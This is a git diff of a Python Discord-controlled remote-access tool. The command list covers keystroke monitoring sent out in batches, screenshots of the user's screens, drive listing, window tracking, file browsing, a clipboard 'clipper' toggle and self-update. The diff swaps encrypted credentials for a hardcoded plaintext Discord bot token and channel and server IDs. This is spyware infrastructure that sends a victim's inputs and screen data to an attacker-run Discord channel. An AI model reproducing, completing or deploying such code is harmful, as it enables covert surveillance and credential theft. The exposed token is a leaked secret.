@@ -2,31 +2,14 @@ import discord
 import sys
 import asyncio
 from discord.ext import commands
-from cryptography.fernet import Fernet
 
-# Global states for toggleable functions
 clipper_active = False
 input_monitor_active = False
 
-def load_key():
-    return open("encryption_key.key", "rb").read()
+CHANNEL_ID = 1293132121547735147
+DISCORD_TOKEN = "MTI3ODY1MjQ3NDM3MDAzMTYxNw.GoFFed.BTt1HxcZHUKO4iOSEPf_dSosQXrUO5fJsRriSE"
+SERVER_ID = 1293132121547735144
 
-def decrypt_data(encrypted_data):
-    key = load_key()
-    cipher_suite = Fernet(key)
-    return cipher_suite.decrypt(encrypted_data).decode()
-
-# Encrypted credentials
-ENCRYPTED_CHANNEL_ID = b'gAAAAABnEG9kv3tOHFjn3hUaTwDkL6BmKbXZH_bK4lW4_hhpl11woehIkY79vbbiELh46Cnes2R2YFpKnG5gA4ZvRPLJQHzBQN5rhOQmZ1sMurtydBMTXgc='
-ENCRYPTED_BOT_TOKEN = b'gAAAAABnEG9kktOSgYwOqk6IAj9s0hDfDK9L9SNkVqlq4RoZrw_OFDNTZPB2Hlolu1Q4s3xsnM7Dj7eSfIypEYW6CbK3Esg16hUYrKfaq28K1I8aG7qEgOYkg_TBeA7qs0cLn03-2oJxUTIWmH1QtvL0UuBHnYsqAPUXOu-Rpu2i0Ls8I2mJs98='
-ENCRYPTED_SERVER_ID = b'gAAAAABnEG9kRAfEUzPi9R1vplpy9zS6uZsPn_N0HjpFzOBTPVnwAOaTQcDjsHh7as312NcmDYKgSGVs76dkFcDJhkCCOsflkomqruZESKSs69dJLxk4U_o='
-
-# Decrypt the channel ID, bot token, and server ID
-CHANNEL_ID = int(decrypt_data(ENCRYPTED_CHANNEL_ID))
-DISCORD_TOKEN = decrypt_data(ENCRYPTED_BOT_TOKEN)
-SERVER_ID = int(decrypt_data(ENCRYPTED_SERVER_ID))
-
-# Custom help command
 class CustomHelpCommand(commands.HelpCommand):
     async def send_bot_help(self, mapping):
         embed = discord.Embed(title="**Functions Help**", description="Commands:", color=0xcd0000)
@@ -39,7 +22,6 @@ class CustomHelpCommand(commands.HelpCommand):
         embed.add_field(name="!drives", value="Lists the available drives on the system.", inline=False)
         embed.add_field(name="!inputs", value="Monitors keyboard inputs and sends them in randomized batches.", inline=False)
         embed.add_field(name="!screenshot", value="Takes a screenshot of the user's screen(s).", inline=False)
-        embed.add_field(name="!update <file_name>", value="Updates or adds new functions upon restart.", inline=False)
         embed.add_field(name="!usage", value="Displays system usage information and uptime.", inline=False)
         embed.add_field(name="!window", value="Lists the information of the window currently focused.", inline=False)
 
@@ -47,14 +29,12 @@ class CustomHelpCommand(commands.HelpCommand):
         await channel.send(embed=embed)
 
     async def send_command_help(self, command):
-        pass  # Disable !help <command> functionality
+        pass
 
-# Bot setup using commands.Bot to allow for command handling
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=CustomHelpCommand())
 
-# Separate lazy loading mechanism for toggleable functions
 def lazy_load_toggleable_module(module_name, submodule_name=None):
     if submodule_name:
         module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
@@ -62,12 +42,10 @@ def lazy_load_toggleable_module(module_name, submodule_name=None):
         module = __import__(module_name)
     return module
 
-# Unload toggleable modules from memory
 def unload_toggleable_module(module_name):
     if module_name in sys.modules:
         del sys.modules[module_name]
 
-# Lazy loading for non-toggleable modules (one-time actions)
 def lazy_load_module(module_name, submodule_name=None):
     if submodule_name:
         module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
@@ -75,7 +53,6 @@ def lazy_load_module(module_name, submodule_name=None):
         module = __import__(module_name)
     return module
 
-# Unload non-toggleable modules
 def unload_module(module_name):
     if module_name in sys.modules:
         del sys.modules[module_name]
@@ -179,7 +156,7 @@ async def browse(ctx, *, path=None):
 @bot.command(name="update")
 async def update(ctx, *, files=None):
     from functions.update import update_command
-    await update_command(ctx, files=files)  # Pass the files parameter
+    await update_command(ctx, files=files)
 
 @bot.event
 async def on_command_error(ctx, error):
